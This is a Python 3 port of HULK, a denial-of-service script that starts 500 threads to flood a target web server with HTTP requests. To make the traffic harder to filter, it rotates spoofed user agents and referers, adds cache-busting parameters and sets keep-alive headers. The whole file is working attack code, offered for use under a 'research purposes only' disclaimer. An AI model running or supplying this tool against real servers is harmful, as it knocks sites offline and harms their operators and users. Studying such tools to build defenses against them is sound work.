# ----------------------------------------------------------------------------------------------
# HULK - HTTP Unbearable Load King
#
# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
# to their knees by exhausting the resource pool, its is meant for research purposes only
# and any malicious usage of this tool is prohibited.
#
# author :  Barry Shteiman , version 1.0
# ----------------------------------------------------------------------------------------------
#
# changed to python 3
#import urllib2
import urllib.request
import sys
import threading
import random
import re

#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML. like Gecko) Chrome/69.0.3497.100 Safari/537.36')
	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0')
	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML. like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299')
	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; USPortal; rv:11.0) like Gecko')
	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko')
	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML. like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134')
	headers_useragents.append('Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML. like Gecko) Version/11.0 Mobile/15E148 Safari/604.1')
	headers_useragents.append('Mozilla/5.0 (Linux; Android 8.0.0) AppleWebKit/537.36 (KHTML. like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36')
	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print ('---------------------------------------------------')
	print ('USAGE: python hulk.py <url>')
	print ('you can add "safe" after url, to autoshut after dos')
	print ('---------------------------------------------------')

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	#request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	#request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	rInt = random.randint(1,8)
	request = urllib.request.Request(url + param_joiner + 'btn%d=%d' % (rInt, rInt))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			#urllib2.urlopen(request)
			urllib.request.urlopen(request)
	#except urllib2.HTTPError as e:
	except urllib.error.HTTPError as e:
			#print e.code
			set_flag(1)
			print ('Response Code 500')
			code=500
	#except urllib2.URLError as e:
	except urllib.error.URLError as e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			#urllib2.urlopen(request)
			urllib.request.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if code==500 and safe==1:
					set_flag(2)
		except Exception as ex:
			print(ex)

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) and (previous != request_counter):
				print ("%d Requests Sent" % (request_counter))
				previous=request_counter
		if flag==2:
			print("\n-- HULK Attack Finished --")

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print("-- HULK Attack Started --")
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('(https?\://)?([^/]*)/?.*', url)
		host = m.group(2)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
